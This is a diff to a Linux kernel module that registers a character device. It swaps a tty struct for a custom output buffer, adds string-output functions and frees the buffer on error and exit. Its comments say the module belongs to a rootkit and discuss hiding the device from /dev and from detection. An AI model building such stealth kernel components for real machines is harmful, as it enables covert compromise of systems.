@@ -3,8 +3,6 @@
 
 // based on http://www.faqs.org/docs/kernel/x571.html /  http://www.tldp.org/LDP/lkmpg/2.6/html/x569.html
 
-/// is a tty device different / ...? e.g. what if the user presses back space / will things be displayed in real time / will it matter...?
-
 
 #include <linux/module.h>   // For modules
 #include <linux/kernel.h>   // For KERN_INFO
@@ -13,11 +11,13 @@
 #include <linux/err.h>
 #include <linux/device.h>
 #include <asm/uaccess.h>  /* for put_user */
-#include <linux/tty.h>
-//#include <linux/tty_driver.h>
 
 #include "constants.h"
 #include "outputDevice.h"
+#include "buffer/buffer.h"
+
+#define ERROR_CREATING_OUTPUT_DEVICE_RETURN_VALUE 1 // can not be 0
+#define OUTPUT_BUFFER_SIZE 4096 // should be based on size in tty / preferably less than page size.
 
 
 // Function prototypes
@@ -49,7 +49,7 @@ static struct file_operations fops = {
 	.release = device_release
 };
 
-static struct tty_struct ttyInfo;
+static Buffer buffer = NULL;
 
 // Functions
 /* 
@@ -57,27 +57,33 @@ detection:
 The device will be registered e.g. a slot in the file table will be there. The only way around this is to perhaps use a large enough number random number that is hard to find
 Though won't work well..
 */
-int outputDevice_init(void) {
-	tty_buffer_init(&ttyInfo);
-	//initialize_tty_struct(&ttyInfo, tty_driver *driver, int idx);
-	
-	
+int outputDevice_init(void) {	
+	buffer = createBuffer(OUTPUT_BUFFER_SIZE);
+	if (buffer == NULL) {
+		return ERROR_CREATING_OUTPUT_DEVICE_RETURN_VALUE;
+	}
 	// Register the character device and get the major descriptor number
 	Major = register_chrdev(0, DEVICE_NAME, &fops);
 
 	if (Major < 0) {
 		printk (KERN_INFO "Registering the character device failed with %d\n", Major);
+		destroyBuffer(buffer); //TODO: extract method
+		buffer = NULL; 
 		return Major;
 	}
 	
 	// create the device class / registering in /dev is done for convience. If wanting to hide the rootkit this might not be done.. Though can hide the file there..
 	outputDeviceClass = class_create(THIS_MODULE, CLASS_NAME);
 	if (IS_ERR(outputDeviceClass)) {
+		destroyBuffer(buffer);
+		buffer = NULL;
 		return PTR_ERR(outputDeviceClass);
 	}
 	
 	outputDeviceDevice = device_create(outputDeviceClass, NULL, MKDEV(Major, 0), NULL, DEVICE_NAME_IN_DEV_DIR);
 	if (IS_ERR(outputDeviceDevice)) {
+		destroyBuffer(buffer);
+		buffer = NULL;
 		printk(KERN_ERR "failed to create device '%s_%s'\n", CLASS_NAME, DEVICE_NAME); // TODO: add print error function etc..
 		return PTR_ERR(outputDeviceDevice);
 	}
@@ -91,8 +97,19 @@ int outputDevice_init(void) {
 	//printk("<1>Try various minor numbers.  Try to cat and echo to\n"); // minor numbers are only used for 
 	//printk("the device file.\n");
 
-
 	return 0;
+}
+
+
+static void addCharacterToOutputDevice(char ch) {
+	addToBuffer(buffer, ch);
+}
+
+void addToOutputDevice(char *str) {
+	while (*str != '\0') {
+		addCharacterToOutputDevice(*str);
+		str++;
+	}
 }
 
 
@@ -102,6 +119,8 @@ void outputDevice_exit(void) {
 	class_destroy(outputDeviceClass);
 	
 	unregister_chrdev(Major, DEVICE_NAME);
+	destroyBuffer(buffer);
+	buffer = NULL;
 }  
 
 
